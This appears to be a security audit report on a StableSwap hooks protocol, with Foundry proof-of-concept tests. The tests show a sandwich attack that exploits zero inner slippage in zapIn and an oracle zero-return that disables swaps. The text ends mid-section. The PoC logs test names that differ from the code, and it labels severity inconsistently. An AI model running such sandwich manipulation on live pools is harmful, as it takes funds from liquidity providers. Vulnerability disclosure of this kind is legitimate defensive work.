| ID                                                                                                               | Title                                                                                                        |
| ---------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------ |
| [M-01](#StableSwapZapIn._addLiquidityAndGetShares()-Zero-Inner-Slippage-on-addLiquidity-Enables-Sandwich-Attacks)                       | StableSwapZapIn._addLiquidityAndGetShares(): Zero Inner Slippage on addLiquidity Enables Sandwich Attacks                                |
| [I-01](#Unguarded-Oracle-Zero-Return-Permanently-Disables-Pool-Swap-Functionality)                              | Unguarded Oracle Zero-Return Permanently Disables Pool Swap Functionality                              |
| [I-02](#h-03-repayBorrowInternal-allows-arbitrary-third-party-to-repay-on-behalf-of-borrower-without-authorization)                                | ...                                         |
| [I-03](#h-04-Supply-Function-Uses-Stale-Exchange-Rate,-Leading-To-Inaccurate-Minting)                             | ...                              |
| [I-04](#m-01-Redeem-function-does-not-call-accrueInterest-leading-to-loss-of-user-interests)                | ...




## StableSwapZapIn._addLiquidityAndGetShares() Zero Inner Slippage on addLiquidity Enables Sandwich Attacks


## Summary
When `zapIn()` adds liquidity on behalf of the user, it internally calls `addLiquidity` with `minAmounts = [0, 0, ...]` and `minShares = 0`. This means the liquidity addition step has no on-chain price protection at all. The only slippage check the user controls — the outer `_minShares` parameter — fires after the state has already been committed, making it ineffective against a sandwich attack that manipulates reserves between the user's swap step and the liquidity addition step.

## Root cause:
https://github.com/revert-finance/stableswap-hooks/blob/main/src%2Fperiphery%2FStableSwapZapIn.sol#L424&#L429


## Finding Description
`zapIn()` executes in two sequential steps within the same transaction. First, it optionally executes rebalancing swaps via `poolManager.unlock()`. Second, it calls `_addLiquidityAndGetShares()` to deposit the resulting token balances into the pool. The vulnerability lives in that second step:

```solidity
function _addLiquidityAndGetShares(...) internal returns (uint256 sharesReceived) {
    uint256[] memory minAmounts = new uint256[](len); // all zeros — no per-token protection
    _hooks.addLiquidity{value: nativeValue}(balances, minAmounts, 0); // minShares = 0
    ...
}
```

The outer check in `zapIn()` reads:

```solidity
if (sharesReceived < _minShares) revert SlippageExceeded();
```

This structure creates two concrete attack vectors.

The first is a straightforward sandwich. An attacker front-runs the victim's `zapIn` with a large swap that skews the pool reserves heavily in one direction. The victim's `_addLiquidityAndGetShares()` then executes `addLiquidity` against the manipulated pool — because `minAmounts` is all zeros and `minShares` is zero, the call cannot revert regardless of how bad the effective rate has become. The victim receives far fewer LP shares than the current fair price should give them. The attacker then back-runs to restore the pool and pockets the difference.

The second vector affects even diligent users who set a tight `_minShares`. Because the quote the user computed was made before the block was settled, the value is stale by the time their transaction executes. An attacker can tune the sandwich depth so that the victim's actual shares land just barely above the stale `_minShares` threshold, meaning the outer check does not fire, yet the victim is still receiving fewer shares than the post-manipulation fair price should give them. With a deeper sandwich the outer check does fire, but this is just a DoS on the user — the attacker can repeat it at low cost to permanently prevent zap users from executing.


## Impact Explanation
Users who call `zapIn()` can receive significantly fewer LP shares than the current market rate entitles them to. The shortfall is silent when `_minShares = 0` and can be tuned around even when `_minShares` is set to the quoted value. There is no per-token amount floor enforced at the point where state actually changes, meaning the protocol accepts any deposit at any price once the transaction reaches `addLiquidity`. In a liquid pool with active MEV, every `zapIn` transaction is a sandwich target with no technical barrier to exploitation.

## Likelihood Explanation:
**Medium.** The attack requires a sandwich setup and is most profitable in pools with deep liquidity and active MEV bots. Users who set `_minShares = 0` (including those who use `zapIn` programmatically without reading the quote) are fully unprotected. Users with tight `_minShares` are partially protected but still DoS-able.


## Proof o Concept
Run: `forge test --match-contract PoC_zapInInnerSlippage -vvv`

TESTS

1. `test_innerZeroSlippage_noRevertOnManipulatedPool` Directly proves addLiquidity is called with zero protection. Manipulates the pool, then calls zapIn; confirms it does NOT revert and that the victim receives materially fewer shares.

2. `test_sandwichShareLoss` End-to-end front-run / victim zapIn / back-run simulation. Measures the victim's share shortfall vs. a fair-price deposit.

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.30;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";

import {Base} from "src/Base.sol";
import {StableSwapHooks} from "src/StableSwapHooks.sol";
import {StableSwapZapIn, Swap, SwapQuote} from "src/periphery/StableSwapZapIn.sol";

import {StableSwapHooksBaseTest} from "test/testUtils/StableSwapHooksBaseTest.sol";




contract PoC_zapInInnerSlippage is StableSwapHooksBaseTest {
    using SafeERC20 for IERC20;

    // -------------------------------------------------------
    //  State
    // -------------------------------------------------------

    StableSwapZapIn internal zapIn;

    /// @dev Separate victim account; distinct from base `swapper`.
    ///      Base `swapper` already has tokens + permit2 approvals and
    ///      is used as the attacker via _executeExactInputSwap().
    address internal victim;

    // -------------------------------------------------------
    //  setUp
    // -------------------------------------------------------

    function setUp() public override {
        // Inherits from StableSwapHooksBaseTest which sets up:
        //   poolManager, permit2, universalRouter
        //   currency0 (DAI, 18 dec), currency1 (USDC, 6 dec)
        //   factory, hooks (2-token DAI/USDC pool)
        //   liquidityProvider — has tokens + hooks approvals
        //   swapper          — has 2 M of each token + permit2 approvals
        super.setUp();

        zapIn = new StableSwapZapIn(address(factory), keccak256(type(StableSwapHooks).creationCode));

        victim = makeAddr("victim");

        // Give victim enough tokens for all three test cases.
        deal(Currency.unwrap(currency0), victim, _toTokenWei(currency0, 500_000));
        deal(Currency.unwrap(currency1), victim, _toTokenWei(currency1, 500_000));

        vm.startPrank(victim);
        IERC20(Currency.unwrap(currency0)).forceApprove(address(zapIn), type(uint256).max);
        IERC20(Currency.unwrap(currency1)).forceApprove(address(zapIn), type(uint256).max);
        vm.stopPrank();
    }

    // -------------------------------------------------------
    //  Internal helpers
    // -------------------------------------------------------

    /// @dev Builds a 2-element amount array.
    function _amounts(uint256 a0, uint256 a1) internal pure returns (uint256[] memory arr) {
        arr = new uint256[](2);
        arr[0] = a0;
        arr[1] = a1;
    }

    /// @dev Empty Swap[] — victim deposits with no rebalancing swaps.
    function _noSwaps() internal pure returns (Swap[] memory) {
        return new Swap[](0);
    }

    /// @dev Seeds the 2-token hooks pool via the base-test helper.
    function _seedPool() internal {
        _addLiquidity(500_000, 500_000);
    }

    // -------------------------------------------------------
    //  TEST 1
    //  Proves the inner addLiquidity receives minAmounts=[0,0],
    //  minShares=0 regardless of pool state.
    // -------------------------------------------------------

    /// @notice Verifies that _addLiquidityAndGetShares() passes zero
    ///         slippage bounds to addLiquidity even when reserves are
    ///         severely skewed by a prior manipulation.
    ///
    ///         If inner protection existed the zapIn would revert after
    ///         the manipulation.  We show it does NOT revert, and that
    ///         the victim receives materially fewer shares than the
    ///         pre-manipulation fair quote.
    function test_innerZeroSlippage_noRevertOnManipulatedPool() public {
        _seedPool(); // 500 k DAI : 500 k USDC

        uint256 victimAmount0 = _toTokenWei(currency0, 10_000);
        uint256 victimAmount1 = _toTokenWei(currency1, 10_000);

        // ── Quote under FAIR conditions ──────────────────────────────────────
        (uint256 fairShares,,) = zapIn.quoteZapIn(
            address(hooks),
            _amounts(victimAmount0, victimAmount1),
            1
        );
        assertGt(fairShares, 0, "Pre-condition: fair quote must be non-zero");

        // ── Attacker: large front-run swap (sell currency0, drain currency1) ─
        // Sells 400 k DAI into a 500 k pool — heavily skews reserves.
        // _executeExactInputSwap uses vm.prank(swapper) internally.
        uint256 attackAmount = _toTokenWei(currency0, 400_000);
        _executeExactInputSwap(true /* zeroForOne */, attackAmount);

        // ── Victim zapIn: _minShares = 0, no inner protection ────────────────
        // The root cause: addLiquidity is called with minAmounts=[0,0], minShares=0
        // so it CANNOT revert regardless of reserve skew.
        vm.prank(victim);
        zapIn.zapIn(
            address(hooks),
            _amounts(victimAmount0, victimAmount1),
            _noSwaps(),
            0 // outer _minShares = 0 (worst case)
        );

        uint256 victimShares = hooks.balanceOf(victim);

        emit log_named_uint("Fair shares (pre-manipulation)", fairShares);
        emit log_named_uint("Actual shares (post-manipulation)", victimShares);
        emit log_named_uint(
            "Share loss %",
            fairShares > 0 ? ((fairShares - victimShares) * 100) / fairShares : 0
        );

        // zapIn did NOT revert — proving zero inner slippage protection.
        // The victim received fewer shares than the fair price (>5 % threshold).
        assertLt(
            victimShares,
            (fairShares * 95) / 100,
            "BUG Test 1: victim should receive materially fewer shares after manipulation"
        );
    }

    // -------------------------------------------------------
    //  TEST 2
    //  End-to-end sandwich: victim's share shortfall is measurable.
    // -------------------------------------------------------

    /// @notice Simulates a full front-run / victim / back-run sandwich.
    ///
    ///         Tx ordering within the block:
    ///           1. Attacker (swapper) sells currency0, skewing reserves.
    ///           2. Victim's zapIn executes — inner addLiquidity has no
    ///              slippage protection.
    ///           3. Attacker back-runs: buys currency0 to restore pool.
    ///
    ///         The victim's share count is significantly below what the
    ///         same deposit would have produced without the sandwich.
    function test_sandwichShareLoss() public {
        _seedPool(); // 500 k : 500 k

        uint256 victimAmount0 = _toTokenWei(currency0, 50_000);
        uint256 victimAmount1 = _toTokenWei(currency1, 50_000);

        // ── Baseline: what shares should this deposit produce? ───────────────
        (uint256 fairShares,,) = zapIn.quoteZapIn(
            address(hooks),
            _amounts(victimAmount0, victimAmount1),
            1
        );

        // ── Step 1: Front-run ─────────────────────────────────────────────────
        uint256 frontRunAmount = _toTokenWei(currency0, 300_000); // 60 % of pool
        _executeExactInputSwap(true, frontRunAmount);

        // ── Step 2: Victim zapIn ──────────────────────────────────────────────
        vm.prank(victim);
        zapIn.zapIn(
            address(hooks),
            _amounts(victimAmount0, victimAmount1),
            _noSwaps(),
            0
        );

        uint256 victimShares = hooks.balanceOf(victim);

        // ── Step 3: Back-run ──────────────────────────────────────────────────
        uint256 backRunAmount = _toTokenWei(currency1, 300_000);
        _executeExactInputSwap(false, backRunAmount);

        emit log_named_uint("[VICTIM] Fair shares (no sandwich)", fairShares);
        emit log_named_uint("[VICTIM] Actual shares (sandwiched)", victimShares);
        emit log_named_int(
            "[VICTIM] Shortfall",
            int256(fairShares) - int256(victimShares)
        );

        // Victim's shares are significantly below fair value.
        // The inner zero-slippage call absorbed the loss silently.
        assertLt(
            victimShares,
            (fairShares * 90) / 100,
            "BUG Test 2: sandwich caused >10 % share loss due to missing inner slippage protection"
        );
    }
}
```

## Output

```md
[⠊] Compiling...
[⠰] Compiling 1 files with Solc 0.8.30
[⠔] Solc 0.8.30 finished in 2.25s
Compiler run successful!

Ran 2 tests for test/PoC_zapInInnerSlippage.t.sol:PoC_zapInInnerSlippage
[PASS] test_risk05_innerZeroSlippage_noRevertOnManipulatedPool() (gas: 702472)
Logs:
  Fair shares (pre-manipulation): 10000000000000000000000
  Actual shares (post-manipulation): 5555555555555555555555
  Share loss %: 44

[PASS] test_risk05_sandwichShareLoss() (gas: 844400)
Logs:
  [VICTIM] Fair shares (no sandwich): 50000000000000000000000
  [VICTIM] Actual shares (sandwiched): 31250000000000000000000
  [VICTIM] Shortfall: 18750000000000000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.44s (3.19ms CPU time)

Ran 1 test suite in 2.44s (2.44s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```


## Recommendation
`_addLiquidityAndGetShares()` should derive meaningful `minAmounts` from the current balances before passing them to `addLiquidity`. The simplest correct fix is to pass the actual token balances the contract holds as the minimum amounts, since those are exactly what was just obtained from the preceding swap step — accepting any outcome below those amounts makes no sense:

```solidity
function _addLiquidityAndGetShares(...) internal returns (uint256 sharesReceived) {
    uint256[] memory minAmounts = new uint256[](len);
    for (uint256 i = 0; i < len; ++i) {
        minAmounts[i] = ...; // actual balance just obtained — use as floor
    }
    _hooks.addLiquidity{value: nativeValue}(balances, minAmounts, 0);
    ...
}
```

A stricter fix would propagate a caller-supplied `minAmounts[]` all the way through `zapIn()` so users can set per-token bounds explicitly, similar to how `addLiquidity` already exposes this to direct callers. The outer `_minShares` parameter should be kept as an additional guard but should not be the only one.


---


## Unguarded Oracle Zero-Return Permanently Disables Pool Swap Functionality


## Summary
Oracle Zero-Return Disables Swaps and addLiquidity; No Oracle Update Mechanism.

## Target
https://github.com/revert-finance/stableswap-hooks/blob/main/src%2FBase.sol#L191-L192

## Finding Description
The `_getRate()` function in `Base.sol` fetches an exchange rate from an external oracle and multiplies it against the token's base rate. If the oracle returns `0`, the resulting effective rate is silently zeroed with no validation or revert:

```solidity
// Base.sol
uint256 fetchedRate = abi.decode(returnData, (uint256));
rate = rate * fetchedRate / StableSwapMath.RATE_PRECISION; // rate = 0 if fetchedRate = 0
```
This zeroed rate propagates into `_createSwapContext()` in `Swap.sol`, where every currency's scaled reserve is computed before each swap:
```solidity
// Swap.sol — _createSwapContext()
for (uint256 i = 0; i < currenciesLength; ++i) {
    ctx.scaledReserves[i] = StableSwapMath.scaleTo(reserves[i], _getRate(i));
}
```
`scaleTo` is a simple multiplication:
```solidity
// StableSwapMath.sol
function scaleTo(uint256 _amount, uint256 _rate) internal pure returns (uint256) {
    return _rate * _amount / RATE_PRECISION; // = 0 when _rate = 0
}
```
When `_getRate(i)` returns `0` for any currency i, `scaledReserves[i]` becomes `0`. The Newton-Raphson loop in `getInvariant()` then immediately divides by this zero value:
```solidity
// StableSwapMath.sol — getInvariant()
if (totalReserves == 0) {
    return 0; // only guards the ALL-zero case, not the single-zero case
}

for (uint256 i = 0; i < 255; ++i) {
    uint256 invariantProduct = invariant;

    for (uint256 j = 0; j < nCurrencies; ++j) {
        invariantProduct = (invariantProduct * invariant) / _scaledReserves[j]; // PANIC: division by zero
    }
    // ...
}
```
The early `totalReserves == 0` guard only catches the case where every currency's scaled reserve is zero simultaneously. In a 2-token pool where only one oracle returns 0, `totalReserves` is still nonzero (from the healthy token), the guard is skipped, and the loop divides by `scaledReserves[broken_token] = 0`, triggering a Solidity `0.8` arithmetic panic (Panic(0x12)).
This panic propagates through every swap call path without recovery. Compounding the issue, the `rateOracles` array is populated in the constructor and has no setter anywhere in the contract hierarchy — there is no `setRateOracle()`, no emergency pause, and no admin override:
```solidity
// Base.sol — constructor (only place rateOracles is written)
for (uint256 i = 0; i < currenciesLength; ++i) {
    rates.push(StableSwapMath.getRate(_currencies[i]));
    rateOracles.push(_rateOracles[i]);   // set once, never updated
    // ...
}
```
Once an oracle goes dark, the pool is permanently bricked as a trading venue with no on-chain recovery path. The same zero-rate also disables the initial `addLiquidity` call (the geometric mean of scaled amounts collapses to zero, failing the `InsufficientInitialLiquidity` check), meaning a pool deployed with an already-broken oracle can never be seeded at all.
Importantly, `removeLiquidity` is not affected because `_calculateRemoveLiquidity()` computes withdrawal amounts purely from raw `reserves[]` with no call to `_getRate()`. Existing LP holders can always exit proportionally even after the oracle fails.




## Impact Explanation
A pool using any external rate oracle becomes permanently unusable as an AMM the moment that oracle returns `0`. All four swap variants (`exact-input` and `exact-output` in both directions) revert with an arithmetic panic. The initial deposit is also blocked if the oracle is broken at deployment time. Because `rateOracles[]` has no update mechanism, recovery requires a full contract redeployment and manual LP migration — there is no on-chain fix. The oracle failure scenario is realistic: external oracles can be deprecated, self-destruct, be paused, or return 0 on internal error conditions. Any pool integrating a live oracle (the primary design use-case of the rate oracle feature, as demonstrated by the existing wstETH/stETH test suite) is exposed to this risk for the entirety of its deployment lifetime.
LP funds themselves are recoverable via `removeLiquidity`, which prevents this from reaching critical severity.

## Likelihood Explanation
Medium. Oracles returning `0` is not a hypothetical — it is a documented failure mode of many on-chain price feeds (Chainlink returns 0 for deprecated feeds, push-oracles can be misconfigured, and contracts relying on spot-price oracles can return 0 when liquidity is absent). The protocol explicitly supports and encourages external oracle integration (the codebase ships a `wstETH` oracle test). Any pool that uses this feature is permanently exposed for its entire lifetime, and a single oracle failure permanently kills that pool with no admin recourse.

## Proof of Concept
Run: `forge test --match-contract PoC_OracleZeroReturnTest -vvv`
```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.30;


import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";

import {IV4Router} from "@uniswap/v4-periphery/src/interfaces/IV4Router.sol";
import {Actions} from "@uniswap/v4-periphery/src/libraries/Actions.sol";

import {Base} from "src/Base.sol";
import {StableSwapHooks} from "src/StableSwapHooks.sol";
import {StableSwapHooksFactoryHarness} from "test/testUtils/StableSwapHooksFactoryHarness.sol";
import {ExternalContractsDeployer} from "test/testUtils/ExternalContractsDeployer.sol";
import {Commands} from "test/testUtils/external/libraries/Commands.sol";

// ───────────────────────────────────────────────────────────────────────────
// Oracle mocks
// ───────────────────────────────────────────────────────────────────────────

/// @notice A healthy oracle: always returns 1e18 (1:1 rate, no scaling effect).
contract HealthyOracle {
    function getRate() external pure returns (uint256) {
        return 1e18;
    }
}

/// @notice A broken oracle: always returns 0.
/// Models a deprecated / sunset price feed (e.g. contract self-destructed,
/// or a push-oracle that was never initialised, or one that returns 0 on error).
contract BrokenOracle {
    function getRate() external pure returns (uint256) {
        return 0;
    }
}

/// @notice An oracle whose output can be flipped from healthy to broken
/// within a single test, simulating a live oracle going dark mid-life.
contract LiveOracle {
    bool public isDead;

    function breakOracle() external {
        isDead = true;
    }

    function getRate() external view returns (uint256) {
        return isDead ? 0 : 1e18;
    }
}

// ───────────────────────────────────────────────────────────────────────────
// Test contract
// ───────────────────────────────────────────────────────────────────────────

contract PoC_OracleZeroReturnTest is ExternalContractsDeployer {
    using SafeERC20 for IERC20;

    // ── Constants matching the project's base test ───────────────────────────
    uint256 private constant BASE_LP_FEE_PERCENTAGE       = 500;      // 0.05 %
    uint256 private constant BASE_AMP                     = 100;
    uint256 private constant BASE_PROTOCOL_FEE_PERCENTAGE = 100_000;  // 10 % of LP fees
    uint256 private constant BASE_HOOK_FEE_PERCENTAGE     = 200_000;  // 20 % of LP fees

    uint256 private constant INITIAL_LIQUIDITY = 1_000_000; // token units (scaled by decimals in helpers)
    uint256 private constant SWAP_AMOUNT       = 10_000;    // token units

    // ── Actors ───────────────────────────────────────────────────────────────
    address private defaultAdmin;
    address private liquidityProvider;
    address private swapper;
    address private protocolFeeCollector;
    address private hookFeeCollector;

    // ── Infrastructure ───────────────────────────────────────────────────────
    StableSwapHooksFactoryHarness private factory;

    // ── Pools under test ─────────────────────────────────────────────────────

    /// Pool A: currency1 oracle starts healthy, then goes dark mid-life.
    StableSwapHooks private poolA;
    LiveOracle       private liveOracle;

    /// Pool B: currency1 oracle is already broken at deployment time.
    StableSwapHooks private poolB;

    // ────────────────────────────────────────────────────────────────────────
    // setUp
    // ────────────────────────────────────────────────────────────────────────

    function setUp() public override {
        super.setUp();

        // Warp to a realistic timestamp (avoids Amp ramp-time underflows).
        if (block.chainid == 31337) {
            vm.warp(1_731_337_000);
        }

        defaultAdmin         = makeAddr("defaultAdmin");
        liquidityProvider    = makeAddr("liquidityProvider");
        swapper              = makeAddr("swapper");
        protocolFeeCollector = makeAddr("protocolFeeCollector");
        hookFeeCollector     = makeAddr("hookFeeCollector");

        factory = new StableSwapHooksFactoryHarness(
            IPoolManager(poolManager),
            defaultAdmin,
            protocolFeeCollector,
            hookFeeCollector,
            keccak256(type(StableSwapHooks).creationCode)
        );

        // ── Deploy Pool A (live oracle, initially healthy) ───────────────────
        liveOracle = new LiveOracle();
        poolA = _deployPool(
            _noOracle(),
            _externalOracle(address(liveOracle))
        );

        // ── Deploy Pool B (broken oracle from day one) ───────────────────────
        poolB = _deployPool(
            _noOracle(),
            _externalOracle(address(new BrokenOracle()))
        );

        // Fund and approve actors for both pools.
        _fundAndApprove(address(poolA));
        _fundAndApprove(address(poolB));

        // Seed Pool A with liquidity while the oracle is still healthy.
        _addLiquidity(poolA, INITIAL_LIQUIDITY, INITIAL_LIQUIDITY);
    }

    // ════════════════════════════════════════════════════════════════════════
    // SECTION 1 - Baseline (oracle healthy)
    // ════════════════════════════════════════════════════════════════════════

    /// @notice Confirms Pool A (healthy oracle) is fully functional:
    ///         seeded successfully and swaps execute without issue.
    ///         This is the "before" state that subsequent tests break.
    function test_baseline_healthyOracle_allOperationsSucceed() public {
        // LP shares were minted during setUp.
        uint256 lpBalance = poolA.balanceOf(liquidityProvider);
        assertGt(lpBalance, 0, "LP should hold shares after initial deposit");

        // Swap must succeed when oracle is healthy.
        uint256 outputBefore = IERC20(Currency.unwrap(currency1)).balanceOf(swapper);
        _exactInputSwap(poolA, true /*zeroForOne*/, _wei(currency0, SWAP_AMOUNT));
        uint256 outputAfter = IERC20(Currency.unwrap(currency1)).balanceOf(swapper);

        assertGt(outputAfter, outputBefore, "Swapper should receive currency1");

        console2.log("=== Baseline (oracle healthy) ===");
        console2.log("LP shares held          :", lpBalance);
        console2.log("Output from swap        :", outputAfter - outputBefore);
    }

    // ════════════════════════════════════════════════════════════════════════
    // SECTION 2 - Initial deposit reverts when oracle is broken from day one
    // ════════════════════════════════════════════════════════════════════════

    /// @notice Demonstrates that a pool deployed with a broken oracle cannot
    ///         ever be seeded.  The FIRST addLiquidity call reverts.
    ///
    /// Root cause (Liquidity.sol -> _calculateAddLiquidity, initial path):
    ///
    ///   scaledAmounts[i] = StableSwapMath.scaleTo(_amounts[i], _getRate(i))
    ///
    /// _getRate(1) returns:
    ///   rate = rates[1] * fetchedRate / RATE_PRECISION
    ///        = rates[1] * 0            / 1e18
    ///        = 0
    ///
    /// scaledAmounts[1] = scaleTo(amount, 0) = 0 * amount / 1e18 = 0
    ///
    /// shares = geometricMean([nonzero, 0])
    ///        = sqrt(nonzero * 0)
    ///        = 0
    ///
    /// 0 < MINIMUM_LIQUIDITY (1000)  ->  revert InsufficientInitialLiquidity()
    ///
    /// The pool can never be seeded - all user funds deposited in anticipation
    /// of a future pool launch would sit idle and the pool is dead-on-arrival.
    function test_brokenOracleAtDeployment_initialDepositReverts() public {
        assertEq(poolB.totalSupply(), 0, "Precondition: Pool B must be empty");

        uint256[] memory amounts    = new uint256[](2);
        uint256[] memory minAmounts = new uint256[](2);
        amounts[0] = _wei(currency0, INITIAL_LIQUIDITY);
        amounts[1] = _wei(currency1, INITIAL_LIQUIDITY);

        vm.prank(liquidityProvider);
        vm.expectRevert(
            abi.encodeWithSelector(bytes4(keccak256("InsufficientInitialLiquidity()")))
        );
        poolB.addLiquidity(amounts, minAmounts, 0);

        // Verify the pool remains empty - no state was mutated.
        assertEq(poolB.totalSupply(), 0, "Pool B must remain empty after failed deposit");

        console2.log("=== Initial deposit with broken oracle ===");
        console2.log("poolB.totalSupply() after failed deposit:", poolB.totalSupply());
        console2.log("CONFIRMED: revert InsufficientInitialLiquidity");
    }

    // ════════════════════════════════════════════════════════════════════════
    // SECTION 3 - Swaps revert the moment the oracle returns 0
    // ════════════════════════════════════════════════════════════════════════

    /// @notice Proves that breaking the oracle mid-life permanently disables ALL
    ///         swap directions (exact-input and exact-output, both directions).
    ///
    /// Root cause (Swap.sol -> _createSwapContext):
    ///
    ///   ctx.scaledReserves[i] = StableSwapMath.scaleTo(reserves[i], _getRate(i))
    ///
    /// After _getRate(1) returns 0:
    ///   ctx.scaledReserves[1] = 0 * reserves[1] / 1e18 = 0
    ///
    /// Inside StableSwapMath.getInvariant (first Newton iteration):
    ///   invariantProduct = invariantProduct * invariant / _scaledReserves[1]
    ///                                                  ^^^^^^^^^^^^^^^^^
    ///                                          division by zero -> Panic(0x12)
    ///
    /// Because rateOracles[] has NO setter (verified in test_risk01_noRecoveryPath),
    /// this panic is permanent for the lifetime of the deployed contract.
    function test_oracleGoingDark_allSwapsRevertPermanently() public {
        // ── Step 1: verify swaps work before the oracle breaks ───────────────
        uint256 snapBefore = IERC20(Currency.unwrap(currency1)).balanceOf(swapper);
        _exactInputSwap(poolA, true, _wei(currency0, SWAP_AMOUNT));
        assertGt(
            IERC20(Currency.unwrap(currency1)).balanceOf(swapper),
            snapBefore,
            "Swap must succeed while oracle is healthy"
        );

        // ── Step 2: break the oracle ─────────────────────────────────────────
        liveOracle.breakOracle();
        assertEq(liveOracle.getRate(), 0, "Oracle must now return 0");

        console2.log("=== Oracle broke - rate is now 0 ===");
        console2.log("reserves[0]:", poolA.reserves(0));
        console2.log("reserves[1]:", poolA.reserves(1));
        console2.log("scaledReserves[1] will be: 0  (rates[1] * 0 / 1e18)");

        // ── Step 3: ALL swap variants must now revert ────────────────────────
        // Amounts are precomputed before each vm.expectRevert() block because
        // _wei() calls decimals() (an external call) and would itself be caught
        // by vm.expectRevert() if evaluated in the same expression as the swap.

        // 3a. Exact-input, zeroForOne (currency0 -> currency1)
        //     _getRate(1) == 0 -> scaledReserves[1] == 0 -> div-by-zero in getInvariant
        uint256 amtIn0 = _wei(currency0, SWAP_AMOUNT);
        vm.expectRevert();
        this._exactInputSwapExternal(poolA, true, amtIn0);

        // 3b. Exact-input, oneForZero (currency1 -> currency0)
        //     _getRate(1) == 0 -> scaledReserves[1] == 0 -> same panic
        uint256 amtIn1 = _wei(currency1, SWAP_AMOUNT);
        vm.expectRevert();
        this._exactInputSwapExternal(poolA, false, amtIn1);

        // 3c. Exact-output, zeroForOne
        uint256 amtOut1 = _wei(currency1, SWAP_AMOUNT);
        vm.expectRevert();
        this._exactOutputSwapExternal(poolA, true, amtOut1);

        // 3d. Exact-output, oneForZero
        uint256 amtOut0 = _wei(currency0, SWAP_AMOUNT);
        vm.expectRevert();
        this._exactOutputSwapExternal(poolA, false, amtOut0);

        console2.log("CONFIRMED: all 4 swap variants revert after oracle returns 0");
    }

    // ════════════════════════════════════════════════════════════════════════
    // SECTION 4 - removeLiquidity is NOT broken (funds are recoverable)
    // ════════════════════════════════════════════════════════════════════════

    /// @notice existing LP holders can ALWAYS withdraw via removeLiquidity
    ///         even when the oracle is permanently broken.
    ///
    /// Root cause absence - _calculateRemoveLiquidity (Liquidity.sol):
    ///
    ///   amounts[i] = (_shares * reserves[i]) / currentTotalSupply
    ///
    /// No call to _getRate() on this entire code path.
    /// The withdrawal is purely arithmetic on raw reserves[].

    function test_removeLiquidity_succeedsEvenWithBrokenOracle() public {
        uint256 lpBalance = poolA.balanceOf(liquidityProvider);
        assertGt(lpBalance, 0, "Precondition: LP must hold shares");

        uint256 c0Before = IERC20(Currency.unwrap(currency0)).balanceOf(liquidityProvider);
        uint256 c1Before = IERC20(Currency.unwrap(currency1)).balanceOf(liquidityProvider);

        // Break the oracle - all swaps are now permanently broken.
        liveOracle.breakOracle();

        // removeLiquidity must still succeed - _calculateRemoveLiquidity never
        // calls _getRate().
        uint256[] memory minAmounts = new uint256[](2);
        vm.prank(liquidityProvider);
        poolA.removeLiquidity(lpBalance, minAmounts);

        uint256 c0After = IERC20(Currency.unwrap(currency0)).balanceOf(liquidityProvider);
        uint256 c1After = IERC20(Currency.unwrap(currency1)).balanceOf(liquidityProvider);

        assertGt(c0After, c0Before, "LP must receive currency0");
        assertGt(c1After, c1Before, "LP must receive currency1");
        assertEq(poolA.balanceOf(liquidityProvider), 0, "All LP shares must be burned");

        console2.log("=== removeLiquidity with broken oracle ===");
        console2.log("currency0 recovered:", c0After - c0Before);
        console2.log("currency1 recovered:", c1After - c1Before);
        console2.log("CONFIRMED: funds are NOT permanently locked");
        console2.log("CONFIRMED: severity is HIGH (pool bricked)");
    }

    // ════════════════════════════════════════════════════════════════════════
    // SECTION 5 - No on-chain recovery path exists
    // ════════════════════════════════════════════════════════════════════════

    /// @notice Confirms there is no setter for rateOracles[] anywhere in the
    ///         contract.  Once deployed with a broken oracle, the only remedy
    ///         is a full redeployment - all existing LP positions must migrate.
    ///
    /// Verification method:
    ///   1. Read rateOracles[1] and confirm it points to the LiveOracle.
    ///   2. Attempt a low-level call to a hypothetical setRateOracle() -
    ///      it must fail (unknown function selector).
    ///   3. After the oracle breaks, confirm the stored address is unchanged.
    function test_noRecoveryPath_oracleAddressIsImmutable() public {
        // ── Confirm the oracle address is stored as expected ─────────────────
        (address storedOracle,) = poolA.rateOracles(1);
        assertEq(storedOracle, address(liveOracle), "LiveOracle must be stored at index 1");

        // ── Attempt to call a hypothetical update function ───────────────────
        address newOracle = address(new HealthyOracle());

        (bool success,) = address(poolA).call(
            abi.encodeWithSignature(
                "setRateOracle(uint256,address,bytes4)",
                uint256(1),
                newOracle,
                bytes4(keccak256("getRate()"))
            )
        );
        assertFalse(success, "setRateOracle() must not exist - contract has no recovery function");

        // ── Break the oracle and verify the stored address is immutable ───────
        liveOracle.breakOracle();

        (address storedOracleAfter,) = poolA.rateOracles(1);
        assertEq(
            storedOracleAfter,
            address(liveOracle),
            "rateOracles[1] must remain unchanged - no recovery path"
        );

        // Confirm the broken oracle is actively being used (swap reverts)
        uint256 swapAmt = _wei(currency0, SWAP_AMOUNT);
        vm.expectRevert();
        this._exactInputSwapExternal(poolA, true, swapAmt);

        console2.log("=== No recovery path ===");
        console2.log("Stored oracle address :", storedOracleAfter);
        console2.log("setRateOracle() exists: false");
        console2.log("CONFIRMED: broken pool requires full redeployment to fix");
    }

    // ════════════════════════════════════════════════════════════════════════
    // SECTION 6 - Complete impact summary (end-to-end scenario)
    // ════════════════════════════════════════════════════════════════════════

    /// @notice End-to-end scenario that mirrors real-world impact:
    ///
    ///   T=0  Pool deployed with an external oracle (e.g. wstETH stEthPerToken).
    ///   T=1  LP provides $2M of liquidity - pool is live and generating fees.
    ///   T=2  The oracle is deprecated / self-destructs / starts returning 0.
